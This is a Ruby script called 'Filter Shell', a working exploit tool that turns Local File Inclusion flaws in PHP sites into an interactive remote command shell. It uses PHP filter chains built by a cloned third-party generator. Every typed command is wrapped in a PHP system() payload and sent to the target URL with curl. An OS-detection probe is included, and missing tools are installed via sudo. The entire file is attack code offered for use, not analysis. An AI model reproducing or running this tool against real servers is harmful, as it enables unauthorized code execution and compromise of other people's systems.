#!/usr/bin/env ruby

require 'fileutils'
require 'open3'
require 'readline'
require 'shellwords'

# Check if a command exists and install the package if missing
def check_and_install(command, package)
  unless system("which #{command} > /dev/null 2>&1")
    puts "\e[33m[*] Installing #{package}...\e[0m"
    system("sudo apt update && sudo apt install -y #{package}")
  end
end

# Ensure required tools are installed
%w[python3 figlet git curl grep xargs].each do |cmd|
  check_and_install(cmd, cmd)
end

# Clone php_filter_chain_generator if missing
unless Dir.exist?("php_filter_chain_generator")
  puts "\e[33m[*] Cloning php_filter_chain_generator...\e[0m"
  system("git clone https://github.com/synacktiv/php_filter_chain_generator.git")
end

filter_chain_script = "php_filter_chain_generator/php_filter_chain_generator.py"
abort("\e[31m[!] php_filter_chain_generator.py not found!\e[0m") unless File.exist?(filter_chain_script)

# Display usage/help info
if ARGV.include?('-h') || ARGV.include?('--help')
  puts <<~USAGE
    \e[1;36mUsage:\e[0m ruby #{__FILE__} \e[1;33mhttp://TARGET/path?param=\e[0m

    \e[1;36mFilter Shell v1.0\e[0m

    This tool exploits \e[1;35mLocal File Inclusion (LFI)\e[0m vulnerabilities via
    \e[1;35mPHP filter chaining\e[0m. \e[1;33mNo file upload is required\e[0m — the payload uses PHP filters to execute commands.

    \e[1;31mIMPORTANT:\e[0m
    - Provide a full URL with a path and a parameter vulnerable to LFI, e.g.:
      \e[1;34mhttp://example.com/index.php?file=\e[0m
    - Only \e[1;33mshort commands\e[0m are supported due to payload length limits.
    - Despite limitations, a usable shell can still be obtained.

    Commands inside the interactive shell:
      \e[1;32mhelp\e[0m            → show this help menu
      \e[1;32mset_url [url]\e[0m   → change the target URL
      \e[1;32mcheck [command]\e[0m → show full URL and length before executing
      \e[1;32mos\e[0m              → detect remote OS (Linux or Windows)
      \e[1;32mexit\e[0m            → quit the shell

    Example:
      \e[1;34mruby #{__FILE__} http://example.com/index.php?file=\e[0m
  USAGE
  exit
end

# Validate input URL argument
if ARGV.length != 1 || !ARGV[0].include?('?')
  puts <<~USAGE
    \e[1;31mError:\e[0m You must provide exactly one URL argument including a path and LFI parameter.

    \e[1;36mUsage:\e[0m ruby #{__FILE__} \e[1;33mhttp://TARGET/path?param=\e[0m

    Example:
      \e[1;34mruby #{__FILE__} http://example.com/index.php?file=\e[0m

    This tool uses \e[1;35mPHP filter chaining\e[0m and \e[1;33mdoes not require file uploads\e[0m.
    Only \e[1;33mshort commands\e[0m will work but a shell can still be obtained.

    Use \e[1;32m-h\e[0m or \e[1;32m--help\e[0m for more info.
  USAGE
  exit
end

# --- Fancy Banner ---
system("clear")
puts "\e[31m"
puts <<~BANNER
  ███████╗██╗██╗   ████████╗███████╗██████╗     ███████╗██╗  ██╗███████╗██╗     ██╗   
  ██╔════╝██║██║      ██╔══╝██╔════╝██╔══██╗    ██╔════╝██║  ██║██╔════╝██║     ██║
  █████╗  ██║██║      ██║   █████╗  ██████╔╝    ███████ ███████║█████╗  ██║     ██║ 
  ██╔══╝  ██║██║      ██║   ██╔══╝  ██╔══██╗    ╚════██ ██╔══██║██╔══╝  ██║     ██ 
  ██║     ██║███████╗ ██║   ███████╗██║  ██║    ███████╗██║  ██║███████╗███████╗███████╗
  ╚═╝     ╚═╝╚══════╝ ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
BANNER
puts "\e[0m\n"
puts "\e[1;36m[ Filter Shell v1.0 ]\e[0m\n"
puts "\e[1;34m" + "-" * 72 + "\e[0m"
puts "\e[1;33m📏  Max URL Lengths (Common Guideline Defaults - NOT EXACT):\e[0m"
puts "    \e[36m🔹 Internet Explorer   → \e[1;37m2,083 characters\e[0m"
puts "    \e[36m🔹 Safari / Firefox    → \e[1;37m65,535+ characters (practical limit: ~8,000)\e[0m"
puts "    \e[36m🔹 Chrome              → \e[1;37m~32,000+ characters\e[0m"
puts "    \e[36m🔹 Nginx (default)     → \e[1;37m8,192 bytes\e[0m"
puts "    \e[36m🔹 Apache (default)    → \e[1;37m8,192 bytes (LimitRequestLine)\e[0m"
puts "    \e[36m🔹 IIS (default)       → \e[1;37m16,384 bytes\e[0m"
puts "\e[1;31m    ⚠️  Many servers/applications truncate > 2,048 safely\e[0m"
puts "\e[1;34m" + "-" * 72 + "\e[0m\n"
puts "\e[1;36mEnter \"help\" for more options.\e[0m"

target_url = ARGV[0]

# Show help menu inside shell
def show_help
  puts <<~HELP
    \e[1;34m
    ┌──────────────────────────────────────────────┐
    │               Filter Shell Help              │
    ├──────────────────────────────────────────────┤
    │ help            →  show this menu            │
    │ [command]       →  execute OS commands       │
    │ set_url [url]   →  change the target URL     │
    │ check [command] →  get full url length       │
    │ raw [command]   →  get raw filter chain      │
    │ os              →  detect remote OS          │
    │ exit            →  quit the shell            │
    └──────────────────────────────────────────────┘
    \e[0m
  HELP
end

# Simple typewriter effect for output display
def typewriter(text, delay = 0.001)
  text.each_char { |c| print c; sleep delay }
  puts
end

# Main interactive loop
begin
  loop do
    prompt = "\n\001\e[1;91m\002filter-shell>\001\e[0m\002 "
    input = Readline.readline(prompt, true)
    break if input.nil? # EOF or Ctrl-D

    input.strip!
    next if input.empty?

    case input
    when /^(:)?exit$/i
      puts "\e[33m[*] Exiting Filter Shell. Hack the planet.\e[0m"
      break

    when /^(:)?help$/i
      show_help

    when /^(:)?set_url\s+(http\S+)/i
      target_url = $2
      puts "\e[35m[*] Target URL updated to:\e[0m #{target_url}"

    when /^(:)?check\s+(.*)$/i
      check_input = $2.strip
      payload_cmd = "<?php system(\"#{check_input}\") ?>"
      out, err, status = Open3.capture3("python3 #{filter_chain_script} --chain #{Shellwords.escape(payload_cmd)}")

      if status.success?
        url_suffix = out.lines.find { |line| line.include?('php://') }&.strip
        if url_suffix
          full_url = "#{target_url}#{url_suffix}"
          puts "\e[36m[*] Final URL length: #{full_url.length}\e[0m"
        else
          puts "\e[31m[!] Unable to extract php:// payload.\e[0m"
        end
      else
        puts "\e[31m[!] Error generating chain:\n#{err}\e[0m"
      end

    when /^(:)?raw\s+(.*)$/i
      raw_input = $2.strip
      payload_cmd = "<?php system(\"#{raw_input}\") ?>"
      out, err, status = Open3.capture3("python3 #{filter_chain_script} --chain #{Shellwords.escape(payload_cmd)}")

      if status.success?
        url_suffix = out.lines.find { |line| line.include?('php://') }&.strip
        if url_suffix
          full_url = "#{target_url}#{url_suffix}"
          puts "\e[90m#{full_url}\e[0m"
        else
          puts "\e[31m[!] Unable to extract php:// payload.\e[0m"
        end
      else
        puts "\e[31m[!] Error generating chain:\n#{err}\e[0m"
      end

    when /^(:)?os$/i
      # Try Linux uname
      payload_cmd = "<?php system('uname') ?>"
      out, err, status = Open3.capture3("python3 #{filter_chain_script} --chain #{Shellwords.escape(payload_cmd)} | grep php://")

      if status.success? && !out.strip.empty?
        full_url = "#{target_url}#{out.strip}"
        curl_out, curl_err, curl_status = Open3.capture3("curl -s #{Shellwords.escape(full_url)}")

        if curl_status.success? && !curl_out.strip.empty?
          puts "\e[36m[*] Remote OS detected as Linux/Unix\e[0m"
          next
        end
      end

      # Try Windows ver
      payload_cmd = "<?php system('ver') ?>"
      out, err, status = Open3.capture3("python3 #{filter_chain_script} --chain #{Shellwords.escape(payload_cmd)} | grep php://")

      if status.success? && !out.strip.empty?
        full_url = "#{target_url}#{out.strip}"
        curl_out, curl_err, curl_status = Open3.capture3("curl -s #{Shellwords.escape(full_url)}")

        if curl_status.success? && !curl_out.strip.empty?
          puts "\e[36m[*] Remote OS detected as Windows\e[0m"
          next
        end
      end

      puts "\e[31m[!] Unable to detect remote OS.\e[0m"

    when /^(:)?clear$/i
      system("clear")

    else
      # Execute arbitrary command
      payload_cmd = "<?php system(\"#{input}\") ?>"
      chain_cmd = %Q(python3 #{filter_chain_script} --chain #{Shellwords.escape(payload_cmd)} | grep php:// | xargs -I {} curl -s "#{target_url}{}" > out.tmp && sed -i '$ d' out.tmp && cat out.tmp)

      puts "\e[36m[>] Executing: #{input}\e[0m"

      out, err, status = Open3.capture3(chain_cmd)

      if status.success?
        puts "\e[32m" + "-" * 60
        typewriter(out)
        puts "-" * 60 + "\e[0m"
      else
        puts "\e[31m[!] Command failed:\n#{err}\e[0m"
      end
    end
  end
rescue Interrupt
  puts "\n\e[33m[*] Exiting Filter Shell. Hack the planet.\e[0m"
end